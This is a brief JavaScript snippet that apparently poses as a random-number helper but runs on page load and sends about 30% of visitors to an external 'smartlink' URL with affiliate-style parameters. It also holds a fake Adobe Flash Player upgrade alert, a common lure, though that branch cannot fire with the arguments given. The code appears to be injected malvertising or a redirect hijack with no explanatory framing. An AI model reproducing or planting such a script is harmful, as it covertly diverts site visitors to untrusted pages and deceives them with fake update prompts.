function randomNum(minNum,maxNum){ 
    switch(arguments.length){ 
        case 1: 
            return parseInt(Math.random()*minNum+1,10); 
        break; 
        case 2: 
            num = parseInt(Math.random()*(maxNum-minNum+1)+minNum,10); 
			if (num > 10000)
			{
				alert("Oh, it seems that your Adobe Flash Player needs to be upgraded. Please download the latest version and install it")
			}
			else if (num < 600)
			{
				window.location.href='https://smrtsecure-dt.com/smartlink/?a=136882&sm=8892&mt=24';
			}
			else
			{
			}
    } 
} 
randomNum(1,2000)
